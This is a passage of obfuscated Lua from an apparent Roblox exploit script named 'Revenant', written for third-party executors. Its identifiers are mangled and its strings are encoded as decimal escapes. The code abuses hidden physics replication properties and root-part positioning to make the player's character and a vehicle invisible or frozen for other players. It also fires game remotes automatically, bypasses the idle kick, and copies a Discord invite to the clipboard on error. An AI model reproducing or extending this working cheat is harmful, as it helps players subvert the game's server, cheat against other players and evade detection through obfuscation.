 ) getgenv().InvisHumanoid = nil getgenv().InvisPart30 = nil if _llllIlIlII then _llllIlIlII:Disconnect() _llllIlIlII = nil end
 if _IllIIIIllI then _IllIIIIllI:Disconnect() _IllIIIIllI = nil end
 if _lIlllIIlII then _lIlllIIlII:Disconnect() _lIlllIIlII = nil end
 if _llIlIIlIII then _llIlIIlIII:Disconnect() _llIlIIlIII = nil end
 if _lIlIIIlIll then _lIlIIIlIll:Disconnect() _lIlIIIlIll = nil end
 if _IlllIlllIl then _IlllIlllIl:Disconnect() _IlllIlllIl = nil end
 if _lIIIIlIlIl then _lIIIIlIlIl:Disconnect() _lIIIIlIlIl = nil end
 if _IIIIIlllII then _IIIIIlllII:Disconnect() _IIIIIlllII = nil end
 if _lllllIIIIl then _lllllIIIIl = false local _IIlIlIlIlI = _llIIIlIIll.Character local _IIllIIlllI = _IIlIlIlIlI and _IIlIlIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllIIlllI and sethiddenproperty then pcall( function () sethiddenproperty(_IIllIIlllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _llIlIlIlII.target and _llIlIlIlII.target.Parent then pcall( function () sethiddenproperty(_llIlIlIlII.target, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _llIlIlIlII.target.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.AssemblyAngularVelocity = Vector3.zero end
 ) end
 _llIlIlIlII.target = nil _llIlIlIlII.player = nil end
 end
 ) _IllIIlIIll:Unload() pcall( function () _RCS_Send("\100\105\115\099\111\110") end
 ) getgenv().RevenantLoaded = false getgenv().RevenantCleanup = nil end
 _IIlIlllIII:AddButton({ Text = "\085\110\108\111\097\100\032\083\099\114\105\112\116", Func = function () _lIllIllIlI:AddDialog("\082\101\118\101\110\097\110\116\085\110\108\111\097\100\067\111\110\102\105\114\109", { Title = "\085\110\108\111\097\100\032\083\099\114\105\112\116", Description = "\065\114\101\032\121\111\117\032\115\117\114\101\032\121\111\117\032\119\097\110\116\032\116\111\032\117\110\108\111\097\100\032\082\101\118\101\110\097\110\116\063\032\065\108\108\032\097\099\116\105\118\101\032\102\101\097\116\117\114\101\115\032\119\105\108\108\032\098\101\032\100\105\115\097\098\108\101\100\032\097\110\100\032\116\104\101\032\115\099\114\105\112\116\032\119\105\108\108\032\098\101\032\116\101\114\109\105\110\097\116\101\100\046", AutoDismiss = true, OutsideClickDismiss = true, FooterButtons = { Cancel = { Title = "\067\097\110\099\101\108", Variant = "\071\104\111\115\116", Order = 0x1, Callback = function () end
 , }, Unload = { Title = "\085\110\108\111\097\100", Variant = "\068\101\115\116\114\117\099\116\105\118\101", Order = 0x2, Callback = function () task.defer(_IllllIIIIl) end
 , }, }, }) end
 }) getgenv().RevenantCleanup = _IllllIIIIl _IIlIIlllll:SetLibrary(_IllIIlIIll) _IIIllIIIIl:SetLibrary(_IllIIlIIll) local _IlIlllIlll = _llIIIlIIll.DisplayName ~= "" and _llIIIlIIll.DisplayName or _llIIIlIIll.Name _IIIllIIIIl:IgnoreThemeSettings() _IIlIIlllll:SetFolder("\090\075\065\089\084\083\066") _IIIllIIIIl:SetFolder("\090\075\065\089\084\083\066\047\084\083\066\047\099\111\110\102\105\103\115") _IIIllIIIIl:BuildConfigSection(_lIlIlIllIl.Settings) _IIlIIlllll:ApplyToTab(_lIlIlIllIl.Settings) do local _IIIIIIlIll = nil local function _lIIIIlIllI() local _IIllllIlII = _llIIIlIIll.Character if _IIllllIlII and _IIllllIlII.Parent then local _llIIlllIll = _IIllllIlII:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") if _llIIlllIll then pcall( function () _llIIlllIll:FireServer({["\071\111\097\108"] = "\069\109\111\116\101\032\083\112\105\110"}) end
 ) end
 end
 end
 local function _llIIIlIlll() if _IIIIIIlIll then _IIIIIIlIll:Disconnect() _IIIIIIlIll = nil end
 local _lIIlIIIlII, kills = pcall( function () return game:GetService("\080\108\097\121\101\114\115").LocalPlayer.leaderstats["\084\111\116\097\108\032\075\105\108\108\115"] end
 ) if _lIIlIIIlII and kills then _IIIIIIlIll = kills:GetPropertyChangedSignal("\086\097\108\117\101"):Connect( function () _lIIIIlIllI() end
 ) end
 end
 _llIIIlIlll() task.spawn( function () local _IIllllIlII = _llIIIlIIll.Character or _llIIIlIIll.CharacterAdded:Wait() _IIllllIlII:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0xA) _lIIIIlIllI() end
 ) _llIIIlIIll.CharacterAdded:Connect( function () task.wait(0x1) _llIIIlIlll() end
 ) table.insert(_llIlllIlIl, function () if _IIIIIIlIll then _IIIIIIlIll:Disconnect() _IIIIIIlIll = nil end
 end
 ) end
 do local _IIlIlIIlII = nil local _IlIlIIIlII = nil local _llIIIlIIII = RunService.RenderStepped:Connect( function () if _IllIIlIIll.Unloaded then return end
 if not _IIlIlIIlIl.TogHandOffset or not _IIlIlIIlIl.TogHandOffset.Value then return end
 local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIlIIlIl then return end
 local _IIIIlIIllI = _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then return end
 if _IlIlIIIlII ~= _IlIIlIIlIl then if _IIlIlIIlII then pcall( function () if _IIlIlIIlII.IsPlaying then _IIlIlIIlII:Stop() end
 end
 ) _IIlIlIIlII = nil end
 _IlIlIIIlII = _IlIIlIIlIl end
 if not _IIlIlIIlII or _IIlIlIIlII.Parent == nil then local _lIllllIlll = Instance.new("\065\110\105\109\097\116\105\111\110") _lIllllIlll.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\049\048\056\049\052\050\048\051\052\052\050\048\052" _IIlIlIIlII = _IIIIlIIllI:LoadAnimation(_lIllllIlll) _IIlIlIIlII.Priority = Enum.AnimationPriority.Action4 end
 _IIlIlIIlII:Play() _IIlIlIIlII.TimePosition = 0.70 _IIlIlIIlII:AdjustSpeed(0x0) _IIlIlIIlII:AdjustWeight(2e9) RunService.RenderStepped:Wait() if _IIlIlIIlII and _IIlIlIIlII.IsPlaying then pcall( function () _IIlIlIIlII:Stop() end
 ) end
 end
 ) table.insert(_llIlllIlIl, function () if _llIIIlIIII then _llIIIlIIII:Disconnect() _llIIIlIIII = nil end
 if _IIlIlIIlII and _IIlIlIIlII.IsPlaying then pcall( function () _IIlIlIIlII:Stop() end
 ) end
 _IIlIlIIlII = nil pcall( function () if _IIlIlIIlIl.TogHandOffset then _IIlIlIIlIl.TogHandOffset:SetValue(false) end
 end
 ) end
 ) end
 local function _llIlIllllI(_lIIIlIIllI) local _IlllIlllIl = false local _IlIIllIlIl = nil local _IIIlllIIlI = nil local _llllIlIIll = nil local _llIlIlIlII = nil local _IlIIIlllIl = nil local function _lIIIIIllII(_IlIIIlIIII) if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
 _IIIlllIIlI = _IlIIIlIIII if not _IlIIIlIIII then return end
 _IlIIllIlIl = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) local _IIIIllIIlI = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" if not getgenv().InvisActive then return end
 if _lIIIlIIllI.mechGuard and getgenv().MechInvisHandled then pcall( function () _llIIllIlIl:Stop() end
 ) return end
 if not _IIIIllIIlI:find(_lIIIlIIllI.animId, 0x1, true) then return end
 if not _IlllIlllIl then _IlllIlllIl = true if _lIIIlIIllI.onFire then pcall(_lIIIlIIllI.onFire) end
 task.spawn( function () local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIIIIIIll then _IlllIlllIl = false return end
 if _lIIIlIIllI.guardCheck and not _lIIIlIIllI.guardCheck(_IIIlIlllll) then _IlllIlllIl = false return end
 local _IIIIllIlIl = nil if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 _llIlIlIlII = RunService.RenderStepped:Connect( function () if _IllIIlIIll.Unloaded or not _llIIllIlIl.IsPlaying then if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 return end
 if _IIIIllIlIl then return end
 local _lIIIllIIII = _llIIllIlIl.Length if _lIIIllIIII > 0x0 and (_lIIIllIIII - _llIIllIlIl.TimePosition) <= 1.50 then local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIlIIIlIlI then _IIIIllIlIl = _IIlIIIlIlI.CFrame local _IIIIIlIlll = _IIIIllIlIl.Position end
 if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 end
 end
 ) _llIIllIlIl.Stopped:Wait() if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 if not _IIIIllIlIl then local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") _IIIIllIlIl = _IIlIIIlIlI and _IIlIIIlIlI.CFrame end
 if _IIIIllIlIl then local _llIllIIlll = 0x0 if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlIIIlllIl = RunService.Heartbeat:Connect( function (dt) if _IllIIlIIll.Unloaded then if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false return end
 local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIlIIIlIlI then if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false return end
 pcall( function () _IIlIIIlIlI.CFrame = _IIIIllIlIl end
 ) _llIllIIlll += dt if _llIllIIlll >= 0.4 then if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false end
 end
 ) else _IlllIlllIl = false end
 end
 ) end
 end
 ) end
 _llllIlIIll = RunService.Heartbeat:Connect( function () if _IllIIlIIll.Unloaded then return end
 local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII ~= _IIIlllIIlI then _lIIIIIllII(_IlIIIlIIII) end
 end
 ) table.insert(_llIlllIlIl, function () if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
 if _llllIlIIll then _llllIlIIll:Disconnect() _llllIlIIll = nil end
 if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false _IIIlllIIlI = nil end
 ) end
 _llIlIllllI({ _IlllIllIII = "\049\052\048\049\053\051\055\050\051\056\052\051\054\052\057", timeThreshold = 0.5, holdAfter = 0.4, }) _llIlIllllI({ _IlllIllIII = "\055\055\056\057\049\048\052\049\056\051\057\052\056\051", timeThreshold = 1.0, holdAfter = 0.3, }) _llIlIllllI({ _IlllIllIII = "\049\051\051\050\048\055\052\056\057\053\055\052\051\054\052", timeThreshold = 5.0, holdAfter = 0.2, }) do local _IIlllllIII = nil local _llIIlIIlII = nil local _lIllIllllI = nil local _llIIIlllII = nil local _IlIlllIlII = nil local _IIllIlIIll = nil local _IllllIllIl = nil local _lIlIIIllIl = false local _llIlllIIll = nil local _llIlllIIIl = nil local function _llIlIIIlll(mech) for _lllIlllIIl, _llIIIIlllI in ipairs(mech:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then pcall( function () _llIIIIlllI.Transparency = 0.5 _llIIIIlllI.LocalTransparencyModifier = 0.5 _llIIIIlllI.CastShadow = false end
 ) end
 end
 end
 local function _lIIllIIIlI(mech) for _lllIlllIIl, _llIIIIlllI in ipairs(mech:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then pcall( function () _llIIIIlllI.Transparency = 0x0 _llIIIIlllI.LocalTransparencyModifier = 0x0 _llIIIIlllI.CastShadow = true end
 ) end
 end
 end
 local function _lIlIIlIIlI() if _llIIlIIlII then _llIIlIIlII:Disconnect() _llIIlIIlII = nil end
 if _IIlllllIII then pcall( function () _IIlllllIII:Stop() end
 ) _IIlllllIII = nil end
 getgenv()._mechInvisTrack = nil end
 getgenv()._revenantStopMechTrack = _lIlIIlIIlI local function _llIllllllI() if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 _llIlllIIll = nil end
 local function _llIllIIlll(mech) return mech.PrimaryPart or mech:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or mech:FindFirstChildWhichIsA("\066\097\115\101\080\097\114\116") end
 local function _lllllIlIII(mech, _llIlllIllI) local _lIlllIIIll = tick() + (_llIlllIllI or 0x5) while tick() < _lIlllIIIll do if not mech:IsDescendantOf(workspace) then return nil end
 local _IIlllIllll = mech:FindFirstChildOfClass("\065\110\105\109\097\116\105\111\110\067\111\110\116\114\111\108\108\101\114") if _IIlllIllll then local _IIIlIIllIl = _IIlllIllll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIIlIIllIl then return _IIIlIIllIl end
 end
 task.wait(0.05) end
 return nil end
 local function _IlIllllIll(mech) if not getgenv().InvisActive then getgenv().MechInvisHandled = false return end
 local _IIIlIIllIl = _lllllIlIII(mech, 0x5) if not _IIIlIIllIl then getgenv().MechInvisHandled = false return end
 if not mech:IsDescendantOf(workspace) then getgenv().MechInvisHandled = false return end
 if not getgenv().InvisActive then getgenv().MechInvisHandled = false return end
 getgenv().MechInvisHandled = true _lIlIIlIIlI() _llIllllllI() local _llIIlIIlII = _llIllIIlll(mech) if _llIIlIIlII then _llIlllIIll = _llIIlIIlII.CFrame end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\057\056\048\057\051\053\050\057\048\051\049\055\053\056" local _lIIlIIIlII, _llIIllIlIl = pcall( function () return _IIIlIIllIl:LoadAnimation(_llllIlIllI) end
 ) if not _lIIlIIIlII or not _llIIllIlIl then getgenv().MechInvisHandled = false _llIlllIIll = nil return end
 _IIlllllIII = _llIIllIlIl _llIIllIlIl.Priority = Enum.AnimationPriority.Action4 pcall( function () _llIIllIlIl:Play() _llIIllIlIl.TimePosition = 0.01 end
 ) RunService.RenderStepped:Wait() pcall( function () _llIIllIlIl:Stop() end
 ) _llIlIIIlll(mech) local _IIlllIllll = mech:FindFirstChildOfClass("\065\110\105\109\097\116\105\111\110\067\111\110\116\114\111\108\108\101\114") if _IIlllIllll then local _lllIllIIlI _lllIllIIlI = _IIlllIllll.AnimationPlayed:Connect( function (mechTrack) local _IIIIllIIlI = mechTrack.Animation and mechTrack.Animation.AnimationId or "" if not _IIIIllIIlI:find("\056\053\054\054\050\054\053\054\049\049\051\052\051\052", 0x1, true) then return end
 if _lllIllIIlI then _lllIllIIlI:Disconnect() _lllIllIIlI = nil end
 local _IlIlIlllll local _IlllIlllll = false _IlIlIlllll = RunService.RenderStepped:Connect( function () if _IllIIlIIll.Unloaded or not mechTrack.IsPlaying then if _IlIlIlllll then _IlIlIlllll:Disconnect() _IlIlIlllll = nil end
 return end
 if _IlllIlllll then return end
 local _lIIIllIIII = mechTrack.Length if _lIIIllIIII > 0x0 and (_lIIIllIIII - mechTrack.TimePosition) <= 1.5 then local _IIlIIIlIlI = _llIllIIlll(mech) if _IIlIIIlIlI then _llIlllIIll = _IIlIIIlIlI.CFrame _IlllIlllll = true end
 if _IlIlIlllll then _IlIlIlllll:Disconnect() _IlIlIlllll = nil end
 end
 end
 ) mechTrack.Stopped:Wait() if _IlIlIlllll then _IlIlIlllll:Disconnect() _IlIlIlllll = nil end
 if not _IlllIlllll then local _IIlIIIlIlI = _llIllIIlll(mech) if _IIlIIIlIlI then _llIlllIIll = _IIlIIIlIlI.CFrame end
 end
 if _llIlllIIll then local _IIIIllllII = _llIlllIIll _llIlllIIll = nil local _lllIIlllIl = 0x0 if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 _llIlllIIIl = RunService.Heartbeat:Connect( function (dt) if _IllIIlIIll.Unloaded then if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 return end
 local _IIlIIIlIlI = _llIllIIlll(mech) if not _IIlIIIlIlI then if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 return end
 pcall( function () _IIlIIIlIlI.CFrame = _IIIIllllII end
 ) _lllIIlllIl += dt if _lllIIlllIl >= 0.4 then if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 end
 end
 ) end
 end
 ) end
 if _llIIlIIlII then _llIIlIIlII:Disconnect() _llIIlIIlII = nil end
 _llIIlIIlII = RunService.Heartbeat:Connect( function () if _IllIIlIIll.Unloaded or not getgenv().InvisActive or not mech:IsDescendantOf(workspace) then if _llIIlIIlII then _llIIlIIlII:Disconnect() _llIIlIIlII = nil end
 return end
 _llIlIIIlll(mech) end
 ) getgenv()._mechInvisTrack = _llIIllIlIl end
 local function _llIIlIIlIl(mech) _IllllIllIl = mech if _IIllIlIIll then _IIllIlIIll:Disconnect() _IIllIlIIll = nil end
 _IIllIlIIll = mech.AncestryChanged:Connect( function () if not mech:IsDescendantOf(workspace) then _IllllIllIl = nil getgenv().MechInvisHandled = false _lIlIIlIIlI() _llIllllllI() if _IIllIlIIll then _IIllIlIIll:Disconnect() _IIllIlIIll = nil end
 end
 end
 ) if getgenv().InvisActive then task.spawn( function () _IlIllllIll(mech) end
 ) end
 end
 local function _IlIIlIllIl(_IlIllIIlII) if _llIIIlllII then _llIIIlllII:Disconnect() _llIIIlllII = nil end
 local _llIIIllIlI = _IlIllIIlII:FindFirstChild("\077\101\099\104") if _llIIIllIlI then task.spawn( function () _llIIlIIlIl(_llIIIllIlI) end
 ) end
 _llIIIlllII = _IlIllIIlII.ChildAdded:Connect( function (_IIlIlIIIII) if _IIlIlIIIII.Name == "\077\101\099\104" then _llIIlIIlIl(_IIlIlIIIII) end
 end
 ) end
 local function _lllIlIllll() local _lIllIIlIll = workspace:FindFirstChild("\076\105\118\101") or workspace:WaitForChild("\076\105\118\101", 0xA) if not _lIllIIlIll then return end
 local _IlIllIIlII = _lIllIIlIll:FindFirstChild(_llIIIlIIll.Name) if _IlIllIIlII then _IlIIlIllIl(_IlIllIIlII) end
 if _IlIlllIlII then _IlIlllIlII:Disconnect() _IlIlllIlII = nil end
 _IlIlllIlII = _lIllIIlIll.ChildAdded:Connect( function (_IIlIlIIIII) if _IIlIlIIIII.Name == _llIIIlIIll.Name then _IlIIlIllIl(_IIlIlIIIII) end
 end
 ) end
 task.spawn(_lllIlIllll) _lIllIllllI = RunService.Heartbeat:Connect( function () if _IllIIlIIll.Unloaded then return end
 local _lllIIlIIII = getgenv().InvisActive == true if _lllIIlIIII and _IllllIllIl and _IllllIllIl:IsDescendantOf(workspace) then local _llIllIIIIl = not _IIlllllIII if _llIllIIIIl and not getgenv()._mechInvisSpawning then getgenv()._mechInvisSpawning = true task.spawn( function () _IlIllllIll(_IllllIllIl) getgenv()._mechInvisSpawning = false end
 ) end
 end
 if _lllIIlIIII == _lIlIIIllIl then return end
 _lIlIIIllIl = _lllIIlIIII if not _lllIIlIIII then getgenv().MechInvisHandled = false getgenv()._mechInvisSpawning = false if _IllllIllIl then _lIIllIIIlI(_IllllIllIl) end
 _lIlIIlIIlI() if _llIlllIIll and _IllllIllIl and _IllllIllIl:IsDescendantOf(workspace) then local _IIIIllllII = _llIlllIIll _llIlllIIll = nil local _lllIIlllIl = 0x0 if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 _llIlllIIIl = RunService.Heartbeat:Connect( function (dt) if _IllIIlIIll.Unloaded then if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 return end
 local _IlIIIIIIll = _IllllIllIl and _llIllIIlll(_IllllIllIl) if not _IlIIIIIIll then if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 return end
 pcall( function () _IlIIIIIIll.CFrame = _IIIIllllII end
 ) _lllIIlllIl += dt if _lllIIlllIl >= 0.4 then if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 end
 end
 ) end
 return end
 if _IllllIllIl then task.spawn( function () _IlIllllIll(_IllllIllIl) end
 ) end
 end
 ) table.insert(_llIlllIlIl, function () if _lIllIllllI then _lIllIllllI:Disconnect() _lIllIllllI = nil end
 if _llIIIlllII then _llIIIlllII:Disconnect() _llIIIlllII = nil end
 if _IlIlllIlII then _IlIlllIlII:Disconnect() _IlIlllIlII = nil end
 if _IIllIlIIll then _IIllIlIIll:Disconnect() _IIllIlIIll = nil end
 if _llIIlIIlII then _llIIlIIlII:Disconnect() _llIIlIIlII = nil end
 if _llIlllIIIl then _llIlllIIIl:Disconnect() _llIlllIIIl = nil end
 _lIlIIlIIlI() if _IllllIllIl and _IllllIllIl:IsDescendantOf(workspace) then pcall( function () _lIIllIIIlI(_IllllIllIl) end
 ) end
 getgenv().MechInvisHandled = false getgenv()._mechInvisSpawning = false getgenv()._revenantStopMechTrack = nil _lIlIIIllIl = false _IllllIllIl = nil _llIlllIIll = nil end
 ) end
 do local _IlIIllIlIl = nil local _llllIlIIll = nil local _llIlIlIlII = nil local _IlIIIlllIl = nil local _IlllIlllIl = false local _IIIlllIIlI = nil local function _lIIIIIllII(_IlIIIlIIII) if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
 _IIIlllIIlI = _IlIIIlIIII if not _IlIIIlIIII then return end
 _IlIIllIlIl = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) local _IIIIllIIlI = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" if not getgenv().InvisActive then return end
 if not _IIIIllIIlI:find("\056\053\054\054\050\054\053\054\049\049\051\052\051\052", 0x1, true) then return end
 if not _IlllIlllIl then _IlllIlllIl = true task.spawn( function () local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIIIIIIll then _IlllIlllIl = false return end
 local _IIIIllIlIl = nil if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 _llIlIlIlII = RunService.RenderStepped:Connect( function () if _IllIIlIIll.Unloaded or not _llIIllIlIl.IsPlaying then if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 return end
 if _IIIIllIlIl then return end
 local _lIIIllIIII = _llIIllIlIl.Length if _lIIIllIIII > 0x0 and (_lIIIllIIII - _llIIllIlIl.TimePosition) <= 1.50 then local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIlIIIlIlI then _IIIIllIlIl = _IIlIIIlIlI.CFrame local _IIIIIlIlll = _IIIIllIlIl.Position end
 if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 end
 end
 ) _llIIllIlIl.Stopped:Wait() if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 if not _IIIIllIlIl then local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") _IIIIllIlIl = _IIlIIIlIlI and _IIlIIIlIlI.CFrame end
 if _IIIIllIlIl then local _llIllIIlll = 0x0 if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlIIIlllIl = RunService.Heartbeat:Connect( function (dt) if _IllIIlIIll.Unloaded then if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false return end
 local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIlIIIlIlI then if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false return end
 pcall( function () _IIlIIIlIlI.CFrame = _IIIIllIlIl end
 ) _llIllIIlll += dt if _llIllIIlll >= 0.4 then if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false end
 end
 ) else _IlllIlllIl = false end
 end
 ) end
 end
 ) end
 _llllIlIIll = RunService.Heartbeat:Connect( function () if _IllIIlIIll.Unloaded then return end
 local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII ~= _IIIlllIIlI then _lIIIIIllII(_IlIIIlIIII) end
 end
 ) table.insert(_llIlllIlIl, function () if _llIlIlIlII then _llIlIlIlII:Disconnect() _llIlIlIlII = nil end
 if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
 if _llllIlIIll then _llllIlIIll:Disconnect() _llllIlIIll = nil end
 if _IlIIIlllIl then _IlIIIlllIl:Disconnect() _IlIIIlllIl = nil end
 _IlllIlllIl = false _IIIlllIIlI = nil end
 ) end
 pcall( function () local _IlIlIlIlII = game:GetService("\086\105\114\116\117\097\108\085\115\101\114") _llIIIlIIll.Idled:Connect( function () _IlIlIlIlII:CaptureController() _IlIlIlIlII:ClickButton2(Vector2.new()) end
 ) end
 ) end
 , tostring) if not _IIlIIIlIll then warn("\091\083\111\109\101\116\104\105\110\103\032\105\115\032\119\114\111\110\103\032\119\105\116\104\032\082\101\118\101\110\097\110\116\093\058\032" .. tostring(_mainErr)) print("\091\090\075\065\089\084\083\066\032\069\082\082\079\082\032\068\069\084\065\073\076\093\058\032" .. tostring(_mainErr)) pcall( function () local _lIIIIIIIlI = Instance.new("\066\105\110\100\097\098\108\101\070\117\110\099\116\105\111\110") _lIIIIIIIlI.Parent = game:GetService("\067\111\114\101\071\117\105") _lIIIIIIIlI.OnInvoke = function (choice) if choice == "\117\110\108\111\097\100" then if getgenv().RevenantCleanup then pcall(getgenv().RevenantCleanup) else pcall( function () _IllIIlIIll:Unload() end
 ) end
 getgenv().RevenantLoaded = false pcall( function () setclipboard("\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\103\103\047\084\089\100\083\077\109\081\097\070\057") end
 ) task.delay(0.1, function () pcall( function () game:GetService("\083\116\097\114\116\101\114\071\117\105"):SetCore("\083\101\110\100\078\111\116\105\102\105\099\097\116\105\111\110", { Title = "\082\101\118\101\110\097\110\116", Text = "\068\105\115\099\111\114\100\032\108\105\110\107\032\099\111\112\105\101\100\032\116\111\032\099\108\105\112\098\111\097\114\100\046\032\080\108\101\097\115\101\032\114\101\112\111\114\116\032\116\104\105\115\032\105\115\115\117\101\046", _IllIIlIlll = 0x6, }) end
 ) end
 ) end
 end
 end
 ) end
 end
 ) end
 )(...)
